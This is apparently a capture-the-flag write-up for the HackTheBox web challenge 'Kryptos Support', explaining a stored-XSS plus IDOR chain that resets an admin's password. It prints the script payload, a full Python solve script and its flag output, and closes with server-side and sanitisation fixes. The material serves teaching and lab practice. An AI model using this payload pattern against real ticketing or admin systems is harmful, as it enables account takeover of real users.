---
layout: post
title: "Kryptos Support"
date: 2027-07-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, stored-xss, idor, cwe-79, cwe-639, account-takeover, bot-exploitation, admin-session]
---

## Overview

Kryptos Support is an HTB Web challenge (Easy) from Cyber Apocalypse 2022. It chains [Stored XSS (CWE-79)](https://cwe.mitre.org/data/definitions/79.html) with an [IDOR on a password-change endpoint (CWE-639)](https://cwe.mitre.org/data/definitions/639.html). The support ticket form is public; an admin bot reviews submitted tickets. The password-update API takes the target `uid` from the request body (not from the JWT session), so XSS in a ticket causes the admin's own authenticated browser to overwrite admin's password with a value we choose — then we log in as admin to read the flag on `/admin`.

---

## Source Analysis

### Ticket submission — no auth required

`POST /api/tickets/add` accepts a `message` field with no authentication and stores it for the admin bot to review. No XSS sanitization.

### IDOR password update

`settings.js`:

```javascript
await fetch(`/api/users/update`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({password: password1, uid}),
})
```

The `uid` value comes from a hidden `<input type="hidden" id="uid" value="1">` in the settings form. The server-side handler takes `uid` from the POST body — it verifies the request is authenticated (session cookie required) but does NOT verify that `uid` matches the session's user. Any authenticated user can set any `uid` and change that user's password.

---

## The Exploit Chain

### Step 1 — Submit XSS ticket

Craft a ticket payload that causes the admin bot's browser to call `/api/users/update` with a known password:

```javascript
<script>
fetch('/api/users/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({uid: '1', password: 'hacked123'})
})
</script>
```

```python
import requests
r = requests.post(f"{BASE}/api/tickets/add", json={"message": xss_payload})
# → 200 {"message":"An admin will review your ticket shortly!"}
```

### Step 2 — Admin bot reviews, XSS fires

After ~10–15 seconds, the admin bot visits the ticket review page. The script executes in the admin's authenticated browser session. Because the admin IS uid=1, and `/api/users/update` trusts the `uid` from the body, the admin's own password is set to `hacked123`.

### Step 3 — Login as admin, read flag

```python
import requests, re

s = requests.Session()
s.post(f"{BASE}/api/login", json={"username": "admin", "password": "hacked123"})
r = s.get(f"{BASE}/admin")
print(re.search(r"HTB\{[^}]+\}", r.text).group())
```

---

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}"

NEW_PASS = "hacked123"

xss = f"""<script>fetch('/api/users/update',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{uid:'1',password:'{NEW_PASS}'}})}})</script>"""

s = requests.Session()
r = s.post(f"{BASE}/api/tickets/add", json={"message": xss})
print(f"[*] XSS ticket submitted: {r.status_code}")
time.sleep(15)

s2 = requests.Session()
r = s2.post(f"{BASE}/api/login", json={"username": "admin", "password": NEW_PASS})
r = s2.get(f"{BASE}/admin")
m = re.search(r"HTB\{[^}]+\}", r.text)
if m:
    print(f"\n[+] FLAG: {m.group()}")
```

```
[*] XSS ticket submitted: 200
[+] FLAG: HTB{p0pp1ng_x55_4nd_id0rs_ftw!}
```

---

## Why it worked

Two independent bugs compose into full account takeover:

1. **Stored XSS**: The ticket textarea stores raw HTML/JS with no sanitization. Any visitor to the admin ticket review page executes the script.

2. **IDOR on password update**: The `uid` is a client-controlled parameter — the server checks "is the user authenticated?" but not "is this their uid?" This means any authenticated context (including a victim admin's browser hijacked by XSS) can change arbitrary users' passwords.

The XSS gives us code execution in an authenticated context (the admin's session); the IDOR converts that into a persistent credential change we can use from our own browser.

---

## Fix

```javascript
// Server-side: derive uid from the JWT, not the request body
app.post('/api/users/update', authenticate, (req, res) => {
    const uid = req.session.uid;  // NOT req.body.uid
    const { password } = req.body;
    updatePassword(uid, password);
    res.json({ message: 'Password updated' });
});
```

And sanitize the ticket message before rendering it to the admin:

```javascript
// Sanitize stored content before rendering to admin
const clean = DOMPurify.sanitize(ticket.message);
element.innerHTML = clean;
```
